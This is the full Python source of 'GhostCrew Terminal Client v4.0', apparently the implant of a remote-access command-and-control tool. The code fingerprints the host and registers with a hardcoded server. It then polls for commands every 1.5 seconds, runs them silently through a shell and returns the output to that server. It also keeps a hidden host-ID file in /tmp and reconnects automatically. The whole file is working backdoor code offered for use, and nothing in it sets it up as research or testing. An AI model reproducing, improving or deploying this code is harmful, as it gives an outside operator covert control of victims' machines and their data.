#!/usr/bin/env python3
"""
GhostCrew Terminal Client v4.0 - Linux Version
"""

import os
import sys
import time
import json
import socket
import subprocess
import threading
import requests
import platform
import getpass
import uuid
from urllib.parse import urlparse, parse_qs
from datetime import datetime
import signal
import shlex
import tempfile
import logging

class GhostCrewClient:
    def __init__(self):
        # Configuration
        self.config = {
            'SERVER_URL': 'http://192.168.1.171/GhostCrew/api.php',
            'POLL_INTERVAL': 1.5,
            'PING_INTERVAL': 30.0,
            'AUTO_RECONNECT': True,
            'MAX_RECONNECT_ATTEMPTS': 10,
            'RECONNECT_DELAY_BASE': 3.0,
            'MAX_LOG_LINES': 150,
            'COMMAND_TIMEOUT': 300.0,
            'DEBUG': True
        }
        
        # System state
        self.system = {
            'host_id': None,
            'instance_token': None,
            'is_connected': False,
            'is_registered': False,
            'reconnect_attempts': 0,
            'last_activity': 0,
            'system_info': None,
            'current_working_directory': os.getcwd()
        }
        
        # Session state
        self.session = {
            'active_session_id': None,
            'current_directory': None,
            'environment_vars': {},
            'command_queue': [],
            'processing_command': False,
            'session_start_time': None
        }
        
        # Timers and threads
        self.timers = {
            'poll_timer': None,
            'ping_timer': None,
            'reconnect_timer': None
        }
        
        self.running = True
        self.log_buffer = []
        
        # Setup logging
        logging.basicConfig(
            level=logging.INFO if self.config['DEBUG'] else logging.WARNING,
            format='[%(asctime)s] %(levelname)s: %(message)s',
            datefmt='%H:%M:%S'
        )
        self.logger = logging.getLogger(__name__)
        
        # Initialize environment
        self.initialize_environment()
        
    def log(self, message, level='info'):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        log_entry = f'[{timestamp}] {message}'
        
        # Add to buffer
        self.log_buffer.append(log_entry)
        if len(self.log_buffer) > self.config['MAX_LOG_LINES']:
            self.log_buffer.pop(0)
            
        # Log to console
        if level == 'error':
            self.logger.error(message)
        elif level == 'warning':
            self.logger.warning(message)
        elif level == 'success':
            self.logger.info(f"✓ {message}")
        else:
            self.logger.info(message)
            
    def initialize_environment(self):
        """Initialize shell environment"""
        try:
            # Set initial working directory
            self.system['current_working_directory'] = os.getcwd()
            self.session['current_directory'] = os.getcwd()
            
            # Initialize common environment variables
            common_vars = ['PATH', 'HOME', 'USER', 'SHELL', 'TERM', 'HOSTNAME']
            self.session['environment_vars'] = {}
            
            loaded_vars_count = 0
            for var_name in common_vars:
                if var_name in os.environ:
                    self.session['environment_vars'][var_name] = os.environ[var_name]
                    loaded_vars_count += 1
                    
            self.log("Shell initialized successfully", "success")
            self.log(f"Working directory: {self.session['current_directory']}", "info")
            self.log(f"Environment variables loaded: {loaded_vars_count}", "info")
            
            return True
        except Exception as e:
            self.log(f"Failed to initialize shell: {e}", "error")
            return False
            
    def get_instance_token_from_args(self):
        """Get instance token from command line arguments"""
        for i, arg in enumerate(sys.argv):
            if arg.startswith('--token='):
                return arg[8:]  # Remove '--token='
            elif arg == '--token' and i + 1 < len(sys.argv):
                return sys.argv[i + 1]
        return None
        
    def collect_system_info(self):
        """Collect system information"""
        info = {
            'hostname': 'Unknown',
            'ip_address': '127.0.0.1',
            'os_info': 'Unknown',
            'user_info': 'Unknown',
            'architecture': 'Unknown',
            'domain': 'Unknown'
        }
        
        try:
            # Basic system info
            info['hostname'] = socket.gethostname()
            info['user_info'] = getpass.getuser()
            info['architecture'] = platform.machine()
            
            # OS information
            try:
                os_info = f"{platform.system()} {platform.release()}"
                if platform.version():
                    os_info += f" {platform.version()}"
                info['os_info'] = os_info
            except:
                info['os_info'] = "Linux"
                
            # Try to get domain information
            try:
                domain_result = subprocess.run(['dnsdomainname'], 
                                             capture_output=True, text=True, timeout=5)
                if domain_result.returncode == 0 and domain_result.stdout.strip():
                    info['domain'] = domain_result.stdout.strip()
                else:
                    info['domain'] = 'WORKGROUP'
            except:
                info['domain'] = 'WORKGROUP'
                
            # Get IP address
            try:
                # Try to connect to a remote server to get local IP
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                info['ip_address'] = s.getsockname()[0]
                s.close()
            except:
                try:
                    # Fallback: get from hostname
                    info['ip_address'] = socket.gethostbyname(socket.gethostname())
                except:
                    info['ip_address'] = '127.0.0.1'
                    
        except Exception as e:
            self.log(f"Error collecting system information: {e}", "error")
            
        self.system['system_info'] = info
        self.log(f"System Info: {info['hostname']} ({info['ip_address']}) - {info['user_info']}", "info")
        return info
        
    def make_server_request(self, action, data=None, timeout=30):
        """Make HTTP request to server"""
        try:
            request_data = {'action': action}
            if data:
                request_data.update(data)
                
            response = requests.post(
                self.config['SERVER_URL'],
                data=request_data,
                timeout=timeout,
                headers={'Content-Type': 'application/x-www-form-urlencoded'}
            )
            
            if response.status_code == 200:
                return None, response.json()
            else:
                return Exception(f"HTTP {response.status_code}: {response.reason}"), None
                
        except requests.exceptions.Timeout:
            return Exception("Request timeout"), None
        except requests.exceptions.ConnectionError:
            return Exception("Connection error"), None
        except json.JSONDecodeError as e:
            return Exception(f"JSON parse error: {e}"), None
        except Exception as e:
            return Exception(f"Request error: {e}"), None
            
    def register_with_server(self):
        """Register this host with the server"""
        if not self.system['system_info']:
            self.collect_system_info()
            
        self.log("Registering with server...", "info")
        
        registration_data = {
            'hostname': self.system['system_info']['hostname'],
            'ip_address': self.system['system_info']['ip_address'],
            'os_info': f"{self.system['system_info']['os_info']} ({self.system['system_info']['architecture']})"
        }
        
        if self.system['host_id']:
            registration_data['host_id'] = self.system['host_id']
            
        if self.system['instance_token']:
            registration_data['instance_token'] = self.system['instance_token']
            
        error, response = self.make_server_request('register_host', registration_data)
        
        if error:
            self.log(f"Registration failed: {error}", "error")
            self.handle_connection_error(error)
            return
            
        if response.get('status') == 'success':
            self.system['host_id'] = response['host_id']
            self.system['is_registered'] = True
            self.system['is_connected'] = True
            self.system['reconnect_attempts'] = 0
            self.system['last_activity'] = time.time()
            
            # Persist host ID
            try:
                with open('/tmp/.ghostcrew_host_id', 'w') as f:
                    f.write(self.system['host_id'])
                os.chmod('/tmp/.ghostcrew_host_id', 0o600)
            except:
                pass
                
            self.log("Successfully registered with server", "success")
            self.log(f"Host ID: {self.system['host_id']}", "info")
            if self.system['instance_token']:
                token_preview = self.system['instance_token'][:16] + "..." if len(self.system['instance_token']) > 16 else self.system['instance_token']
                self.log(f"Instance Token: {token_preview}", "info")
                
            self.start_services()
        else:
            error_msg = response.get('message', 'Unknown error')
            self.log(f"Registration failed: {error_msg}", "error")
            self.handle_connection_error(Exception(error_msg))
            
    def start_services(self):
        """Start background services"""
        # Start command polling
        if self.timers['poll_timer']:
            self.timers['poll_timer'].cancel()
        self.timers['poll_timer'] = threading.Timer(self.config['POLL_INTERVAL'], self.poll_for_commands)
        self.timers['poll_timer'].daemon = True
        self.timers['poll_timer'].start()
        
        # Start ping timer
        if self.timers['ping_timer']:
            self.timers['ping_timer'].cancel()
        self.timers['ping_timer'] = threading.Timer(self.config['PING_INTERVAL'], self.ping_server)
        self.timers['ping_timer'].daemon = True
        self.timers['ping_timer'].start()
        
        self.log(f"Services started - Polling every {self.config['POLL_INTERVAL']}s", "success")
        
    def stop_services(self):
        """Stop all background services"""
        for timer_name, timer in self.timers.items():
            if timer:
                timer.cancel()
                self.timers[timer_name] = None
        self.log("All services stopped", "info")
        
    def ping_server(self):
        """Ping server to maintain connection"""
        if not self.running:
            return
            
        if not self.system['is_connected'] or not self.system['host_id']:
            return
            
        ping_data = {'host_id': self.system['host_id']}
        if self.system['instance_token']:
            ping_data['instance_token'] = self.system['instance_token']
            
        error, response = self.make_server_request('ping_host', ping_data)
        
        if error:
            self.log(f"Ping failed: {error}", "warning")
            self.handle_connection_error(error)
            return
            
        if response.get('status') == 'success':
            self.system['last_activity'] = time.time()
        else:
            error_msg = response.get('message', 'Unknown error')
            self.log(f"Ping error: {error_msg}", "warning")
            self.handle_connection_error(Exception(error_msg))
            
        # Schedule next ping
        if self.running and self.system['is_connected']:
            self.timers['ping_timer'] = threading.Timer(self.config['PING_INTERVAL'], self.ping_server)
            self.timers['ping_timer'].daemon = True
            self.timers['ping_timer'].start()
            
    def poll_for_commands(self):
        """Poll server for commands"""
        if not self.running:
            return
            
        if not self.system['is_connected'] or not self.system['host_id'] or self.session['processing_command']:
            if self.running:
                # Schedule next poll
                self.timers['poll_timer'] = threading.Timer(self.config['POLL_INTERVAL'], self.poll_for_commands)
                self.timers['poll_timer'].daemon = True
                self.timers['poll_timer'].start()
            return
            
        poll_data = {'host_id': self.system['host_id']}
        if self.system['instance_token']:
            poll_data['instance_token'] = self.system['instance_token']
            
        error, response = self.make_server_request('get_command', poll_data)
        
        if error:
            self.log(f"Command polling error: {error}", "error")
            self.handle_connection_error(error)
            return
            
        if response.get('status') == 'success' and response.get('command'):
            self.system['last_activity'] = time.time()
            
            # Check if this is a new session
            session_id = response.get('session_id')
            if session_id and session_id != self.session['active_session_id']:
                self.handle_new_session(session_id)
                
            # Process the command silently
            command_data = {
                'id': response['command_id'],
                'command': response['command'],
                'session_id': session_id or self.session['active_session_id']
            }
            
            # Process command in separate thread to avoid blocking
            cmd_thread = threading.Thread(target=self.process_command_silently, args=(command_data,))
            cmd_thread.daemon = True
            cmd_thread.start()
            
        # Schedule next poll
        if self.running:
            self.timers['poll_timer'] = threading.Timer(self.config['POLL_INTERVAL'], self.poll_for_commands)
            self.timers['poll_timer'].daemon = True
            self.timers['poll_timer'].start()
            
    def handle_new_session(self, session_id):
        """Handle new session initialization"""
        if self.session['active_session_id']:
            self.log(f"Ending previous session: {self.session['active_session_id']}", "info")
            
        self.session['active_session_id'] = session_id
        self.session['session_start_time'] = time.time()
        self.reset_shell_for_new_session()
        
        self.log(f"New session started: {session_id}", "success")
        
    def reset_shell_for_new_session(self):
        """Reset shell environment for new session"""
        try:
            # Reset to home directory for new sessions
            home_dir = os.path.expanduser('~')
            self.session['current_directory'] = home_dir
            self.system['current_working_directory'] = home_dir
            self.log("Shell environment reset for new session", "info")
            self.log(f"Working directory reset to: {self.session['current_directory']}", "info")
        except Exception as e:
            self.log(f"Error resetting shell environment: {e}", "error")
            
    def process_command_silently(self, command_data):
        """Process command without showing details"""
        self.session['processing_command'] = True
        start_time = time.time()
        
        try:
            result = self.execute_command(command_data['command'])
            execution_time = time.time() - start_time
            
            self.log(f"Command completed silently in {execution_time:.2f}s", "info")
            self.submit_command_result(command_data['id'], result, execution_time)
            
        except Exception as e:
            execution_time = time.time() - start_time
            error_result = f"Error executing command: {e}"
            
            self.log(f"Command failed: {e}", "error")
            self.submit_command_result(command_data['id'], error_result, execution_time)
            
        self.session['processing_command'] = False
        
    def execute_command(self, command):
        """Execute a command and return output"""
        command = command.strip()
        lower_command = command.lower()
        
        # Handle built-in commands
        if lower_command in ['pwd', 'cd']:
            return self.system['current_working_directory']
            
        if lower_command.startswith('cd '):
            return self.handle_change_directory(command)
            
        if lower_command.startswith('export ') or ('=' in command and ' ' not in command.split('=')[0]):
            return self.handle_set_environment_variable(command)
            
        if lower_command in ['env', 'printenv']:
            return self.handle_show_environment()
            
        if lower_command in ['clear', 'cls']:
            return "Screen cleared (not applicable in remote session)"
            
        # Execute regular command
        return self.execute_command_with_shell_context(command)
        
    def handle_change_directory(self, command):
        """Handle directory change command"""
        try:
            new_path = command[3:].strip()  # Remove 'cd '
            
            if not new_path:
                return self.system['current_working_directory']
                
            # Expand user home directory
            if new_path.startswith('~'):
                new_path = os.path.expanduser(new_path)
            elif not os.path.isabs(new_path):
                # Relative path
                new_path = os.path.join(self.system['current_working_directory'], new_path)
                
            # Normalize path
            target_path = os.path.abspath(new_path)
            
            # Check if directory exists
            if os.path.isdir(target_path):
                self.system['current_working_directory'] = target_path
                self.session['current_directory'] = target_path
                self.log(f"Changed directory to: {target_path}", "info")
                return target_path
            else:
                return f"No such file or directory: {target_path}"
                
        except Exception as e:
            return f"Error changing directory: {e}"
            
    def handle_set_environment_variable(self, command):
        """Handle environment variable setting"""
        try:
            if command.lower().startswith('export '):
                # Remove 'export ' prefix
                var_assignment = command[7:].strip()
            else:
                var_assignment = command.strip()
                
            if '=' not in var_assignment:
                return "Invalid variable assignment syntax"
                
            var_name, var_value = var_assignment.split('=', 1)
            var_name = var_name.strip()
            var_value = var_value.strip()
            
            # Remove quotes if present
            if (var_value.startswith('"') and var_value.endswith('"')) or \
               (var_value.startswith("'") and var_value.endswith("'")):
                var_value = var_value[1:-1]
                
            self.session['environment_vars'][var_name] = var_value
            self.log(f"Environment variable set: {var_name}={var_value}", "info")
            return f"Environment variable {var_name} has been set."
            
        except Exception as e:
            return f"Error setting environment variable: {e}"
            
    def handle_show_environment(self):
        """Show environment variables"""
        try:
            env_list = []
            for var_name, var_value in self.session['environment_vars'].items():
                env_list.append(f"{var_name}={var_value}")
                
            if not env_list:
                return "No custom environment variables set."
                
            return '\n'.join(env_list)
            
        except Exception as e:
            return f"Error displaying environment variables: {e}"
            
    def execute_command_with_shell_context(self, command):
        """Execute command with full shell context"""
        try:
            # Build environment
            env = os.environ.copy()
            env.update(self.session['environment_vars'])
            
            # Execute command
            result = subprocess.run(
                command,
                shell=True,
                cwd=self.system['current_working_directory'],
                env=env,
                capture_output=True,
                text=True,
                timeout=self.config['COMMAND_TIMEOUT']
            )
            
            # Update working directory after command execution
            self.update_current_directory_after_command()
            
            # Combine stdout and stderr
            output = result.stdout
            if result.stderr:
                if output:
                    output += '\n' + result.stderr
                else:
                    output = result.stderr
                    
            # Process output
            output = output.strip()
            
            if output:
                return output
            else:
                if result.returncode == 0:
                    return "Command completed successfully (no output)."
                else:
                    return f"Command completed with exit code: {result.returncode}"
                    
        except subprocess.TimeoutExpired:
            return f"Command timed out after {self.config['COMMAND_TIMEOUT']} seconds"
        except Exception as e:
            return f"Error executing command: {e}"
            
    def update_current_directory_after_command(self):
        """Update current directory after command execution"""
        try:
            # Get current directory by executing pwd
            result = subprocess.run(
                'pwd',
                shell=True,
                cwd=self.system['current_working_directory'],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if result.returncode == 0 and result.stdout.strip():
                new_dir = result.stdout.strip()
                if new_dir != self.system['current_working_directory']:
                    self.system['current_working_directory'] = new_dir
                    self.session['current_directory'] = new_dir
                    
        except Exception:
            # Ignore errors in directory detection
            pass
            
    def submit_command_result(self, command_id, output, execution_time):
        """Submit command result to server"""
        result_data = {
            'command_id': command_id,
            'output': output,
            'execution_time': execution_time,
            'working_directory': self.system['current_working_directory'],
            'exit_code': 0  # Could be enhanced to capture actual exit code
        }
        
        error, response = self.make_server_request('submit_result', result_data)
        
        if error:
            self.log(f"Failed to submit result: {error}", "error")
            return
            
        if response.get('status') != 'success':
            error_msg = response.get('message', 'Unknown error')
            self.log(f"Server rejected result: {error_msg}", "error")
            
    def handle_connection_error(self, error):
        """Handle connection errors"""
        self.system['is_connected'] = False
        self.log(f"Connection error: {error}", "error")
        
        if self.config['AUTO_RECONNECT'] and self.system['reconnect_attempts'] < self.config['MAX_RECONNECT_ATTEMPTS']:
            self.attempt_reconnection()
        else:
            self.log("Connection failed - max reconnection attempts reached", "error")
            self.stop_services()
            
    def attempt_reconnection(self):
        """Attempt to reconnect to server"""
        self.system['reconnect_attempts'] += 1
        delay = self.config['RECONNECT_DELAY_BASE'] * self.system['reconnect_attempts']
        
        self.log(f"Attempting reconnection {self.system['reconnect_attempts']}/{self.config['MAX_RECONNECT_ATTEMPTS']} in {delay}s", "warning")
        
        def reconnect():
            if self.running:
                self.log(f"Reconnection attempt {self.system['reconnect_attempts']}/{self.config['MAX_RECONNECT_ATTEMPTS']}", "info")
                self.register_with_server()
                
        self.timers['reconnect_timer'] = threading.Timer(delay, reconnect)
        self.timers['reconnect_timer'].daemon = True
        self.timers['reconnect_timer'].start()
        
    def load_previous_host_id(self):
        """Load previously saved host ID"""
        try:
            if os.path.exists('/tmp/.ghostcrew_host_id'):
                with open('/tmp/.ghostcrew_host_id', 'r') as f:
                    saved_host_id = f.read().strip()
                    if saved_host_id:
                        self.system['host_id'] = saved_host_id
                        self.log(f"Restored previous host ID: {saved_host_id}", "info")
                        return True
        except Exception as e:
            self.log(f"Could not load previous host ID: {e}", "warning")
        return False
        
    def run(self):
        """Main run loop"""
        self.log("GhostCrew Terminal Client v4.0 - Linux Version", "info")
        self.log("Enhanced with silent command execution and working directory tracking", "info")
        
        # Get instance token from command line
        self.system['instance_token'] = self.get_instance_token_from_args()
        if self.system['instance_token']:
            self.log("Using instance token from command line", "info")
        else:
            self.log("No instance token provided - will register without user association", "warning")
            
        # Try to restore previous host ID
        if not self.load_previous_host_id():
            self.log("Will generate new host ID", "warning")
            
        # Collect system information
        self.collect_system_info()
        
        # Start connection process
        self.register_with_server()
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        # Main loop
        try:
            while self.running:
                time.sleep(1)
                
                # Check for long periods of inactivity
                if self.system['is_connected'] and self.system['last_activity'] > 0:
                    if time.time() - self.system['last_activity'] > 300:  # 5 minutes
                        self.log("Long period of inactivity detected, checking connection...", "warning")
                        self.ping_server()
                        
        except KeyboardInterrupt:
            pass
        finally:
            self.shutdown()
            
    def signal_handler(self, signum, frame):
        """Handle shutdown signals"""
        self.log(f"Received signal {signum}, shutting down...", "info")
        self.running = False
        
    def shutdown(self):
        """Clean shutdown"""
        self.log("Client shutting down...", "info")
        self.running = False
        self.stop_services()
        
        # Clean up temporary files
        try:
            if os.path.exists('/tmp/.ghostcrew_host_id'):
                # Keep the host ID file for next run
                pass
        except:
            pass
            
        self.log("Shutdown complete", "info")

def main():
    """Main entry point"""
    if len(sys.argv) > 1 and sys.argv[1] in ['-h', '--help']:
        print("GhostCrew Terminal Client v4.0 - Linux Version")
        print("Usage: python3 ghostcrew_client.py [--token=TOKEN]")
        print("       python3 ghostcrew_client.py --token TOKEN")
        print("")
        print("Options:")
        print("  --token TOKEN    Instance token for user association")
        print("  -h, --help       Show this help message")
        return
        
    try:
        client = GhostCrewClient()
        client.run()
    except Exception as e:
        print(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()